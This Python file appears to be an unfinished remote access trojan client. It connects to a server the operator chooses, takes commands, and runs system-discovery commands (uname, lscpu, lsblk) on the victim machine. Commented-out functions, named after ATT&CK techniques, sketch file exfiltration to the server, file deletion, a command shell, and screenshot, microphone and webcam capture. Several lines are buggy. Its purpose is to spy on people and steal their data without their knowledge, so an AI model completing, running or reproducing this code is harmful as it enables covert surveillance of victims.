
#**************************************************************************

#import socket
import socket
import threading
import sys

#import  system_information_discovery
import os

#import screan
import pyscreenshot as ImageGrab

#import audio
import pyaudio
import wave

#import video
import cv2
import numpy as np

#**************************************************************************

def system_information_discovery():
	os.system("uname -a >system_information_discovery.txt")
	os.system("lscpu >> system_information_discovery.txt")
	os.system("lsblk >> system_information_discovery.txt")



#**************************************************************************
def main():
	#Get host and port
	host = input("Host: ")
	port = int(input("Port: "))

	#Attempt connection to server
	try:
		sock = socket.socket()
		sock.connect((host, port))

		sock.send('Connection done...')
		
		print("\nExecute commands from the server:\n")
		
		temp=True
		
		while temp:
		
			command=""
			command+=sock.recv(1024)
			command=command.decode()
			
			
			if command=="info":

				system_information_discovery()

				file=open("system_information_discovery.txt","rb")
				string=""
				string+=file.read()
				print(string)

				continue
			
			elif command=="exit":
				print("\nClose the connection and exit for the program.\n")
				temp=False
				break

	except:
		print("Could not make a connection to the server")
		input("Press enter to quit")
		sys.exit(0)
    
	sock.close()
	
main()
#**************************************************************************


		#data = sock.recv(1024)
		# if str(data) == "info":
		# 	data = system_information_discovery()
		# 	sock.send(str(data))
		# continue




# def file_and_directory_discovery():
#  	os.system("tree > file_and_directory_discovery.txt")


#https://www.thepythoncode.com/article/send-receive-files-using-sockets-python

# def remote_file_copy(sock,filename,filesize):

# 	# the name of file we want to send, make sure it exists
# 	filename = "data.csv"
# 	# get the file size
# 	#filesize = os.path.getsize(filename)

# 	# send the filename and filesize
# 	sock.send(f"{filename}{SEPARATOR}{filesize}".encode())

# 	# start sending the file
# 	progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)

# 	with open(filename, "rb") as f:
# 		while True:
# 			# read the bytes from the file
# 			bytes_read = f.read(BUFFER_SIZE)
# 			if not bytes_read:
# 				# file transmitting is done
# 				break
# 			# we use sendall to assure transimission in 
# 			# busy networks
# 			sock.sendall(bytes_read)
# 			# update the progress bar
# 			progress.update(len(bytes_read))
		
	
# def file_deletion(file):
# 	command="rm"
# 	command+=file
# 	os.system(command))

# def input_capture():
	
	
# def clipboard_data():
	
	
# def process_discovery():
	
# 	os.system("pstree>process_discovery.txt")
		
	

# def command_line_interface():
	
# 	print("\nWindows CMD is run:\n")

# 	temp=True

# 	while True:
# 		command=input(">")
# 		if command!="EXIT":
# 			os.system("{}".format(command))
# 			continue
# 		elif command=="EXIT":
# 			temp=False
# 			break

# 		return 


# def capture_screan():
# 	# grab fullscreen
# 	im = ImageGrab.grab()
# 	# save image file
# 	im.save("fullscreen.png")
	
# def capture_audio():
# 	# the file name output you want to record into
# 	filename = "recorded.wav"
# 	# set the chunk size of 1024 samples
# 	chunk = 1024
# 	# sample format
# 	FORMAT = pyaudio.paInt16
# 	# mono, change to 2 if you want stereo
# 	channels = 1
# 	# 44100 samples per second
# 	sample_rate = 44100
# 	record_seconds = 5
# 	# initialize PyAudio object
# 	p = pyaudio.PyAudio()
# 	# open stream object as input & output
# 	stream = p.open(format=FORMAT,channels=channels, rate=sample_rate, input=True, output=True, frames_per_buffer=chunk)
# 	frames = []
# 	print("Recording...")
# 	for i in range(int(44100 / chunk * record_seconds)):
# 	    data = stream.read(chunk)
# 	    # if you want to hear your voice while recording
# 	    # stream.write(data)
# 	    frames.append(data)
# 	print("Finished recording.")
# 	# stop and close stream
# 	stream.stop_stream()
# 	stream.close()
# 	# terminate pyaudio object
# 	p.terminate()
# 	# save audio file
# 	# open the file in 'write bytes' mode
# 	wf = wave.open(filename, "wb")
# 	# set the channels
# 	wf.setnchannels(channels)
# 	# set the sample format
# 	wf.setsampwidth(p.get_sample_size(FORMAT))
# 	# set the sample rate
# 	wf.setframerate(sample_rate)
# 	# write the frames as bytes
# 	wf.writeframes(b"".join(frames))
# 	# close the file
# 	wf.close()

	
# def capture_video():
# 	# Create a VideoCapture object
# 	cap = cv2.VideoCapture(0)

# 	# Check if camera opened successfully
# 	if (cap.isOpened() == False): 
# 	  print("Unable to read camera feed")

# 	# Default resolutions of the frame are obtained.The default resolutions are system dependent.
# 	# We convert the resolutions from float to integer.
# 	frame_width = int(cap.get(3))
# 	frame_height = int(cap.get(4))

# 	# Define the codec and create VideoWriter object.The output is stored in 'outpy.avi' file.
# 	out = cv2.VideoWriter('outpy.avi',cv2.VideoWriter_fourcc('M','J','P','G'), 10, (frame_width,frame_height))

# 	while(True):
# 	  ret, frame = cap.read()

# 	  if ret == True: 
	    
# 	    # Write the frame into the file 'output.avi'
# 	    out.write(frame)

# 	    # Display the resulting frame    
# 	    cv2.imshow('frame',frame)

# 	    # Press Q on keyboard to stop recording
# 	    if cv2.waitKey(1) & 0xFF == ord('q'):
# 	      break

# 	  # Break the loop
# 	  else:
# 	    break  

# 	# When everything done, release the video capture and video write objects
# 	cap.release()
# 	out.release()

# 	# Closes all the frames
# 	cv2.destroyAllWindows()
